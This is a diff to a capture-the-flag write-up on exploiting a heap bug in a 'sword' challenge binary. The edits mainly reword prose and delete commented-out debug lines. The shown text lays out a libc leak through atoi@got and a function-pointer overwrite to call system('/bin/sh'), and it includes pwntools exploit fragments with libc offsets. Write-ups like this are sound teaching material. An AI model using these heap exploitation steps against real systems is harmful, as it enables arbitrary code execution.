@@ -145,9 +145,7 @@ struct sword_s {
 };
 ```
 
-So we will set the name\_length to 8 so we can read 8 bytes from the got entry, set the weight to 0 because we don't need it, and overwrite the sword\_name with atoi@got.
-It is easier to parse the name from the hoo function instead of from the show\_sword function (you can use ..... as a delimeter for parsing for hoo). So I also overwrote
-the first swords function pointer to the hoo function for easy parsing.
+So we will set the name\_length to 8 so we can read 8 bytes from the got entry, set the weight to 0 because we don't need it, and overwrite the sword\_name with atoi@got. The hoo function is the function that is set to the function pointer, and it print's the swords name, just like the show\_sword function, but it is easier to parse the name out (you can just use "....." as a delimeter). So I also overwrote the first swords function pointer to the hoo function for easy parsing.
 
 I will give the full source at the end, but leak\_libc() just parses the hoo function output.
 ```python
@@ -168,9 +166,7 @@ This gives us the output:
 ```
 
 Now we have a leak, and we have arbitrary write to a function pointer, so the next step is pretty simple.
-We have to redo step 1 but use rewrite a sword name to a pointer to "/bin/sh" and a swords function pointer to "system"
-"/bin/sh" can be found in libc, I used radare2 to search for it, but you can use gdb, or almost any other disassembler/debugger/static analysis tool.
-radare2 reported "/bin/sh" at offset 0x18cd57. system@got was at offset 0x45390.
+We have to redo step 1 but instead rewrite a sword name to a pointer to "/bin/sh" and the sword's function pointer to "system". "/bin/sh" can be found in libc, and you can use \[insert favorite static analysis tool here] to search for it, but I used radare2. radare2 reported "/bin/sh" at offset 0x18cd57. system@got was at offset 0x45390.
 
 Putting both parts together:
 
@@ -200,7 +196,6 @@ def harden(p, i, length, name):
     p.sendlineafter("What's the length of the sword name?", length)
     p.sendlineafter("Plz input the sword name.", name)
     p.sendlineafter("What's the weight of the sword?", "-1")
-    #p.recvline_contains("NEW sword")
 
 def leak_libc(p, i):
     p.clean()
@@ -261,9 +256,6 @@ def break_heap():
     fake_free(p, C)
     harden(p, D, "24", "\x07"+"\x00"*7+struct.pack("L", sh)+struct.pack("L", sys))
     use_func(p, C)
-    #gdb.attach(target=p, exe="./sword")
-
-
     p.interactive()
 
 
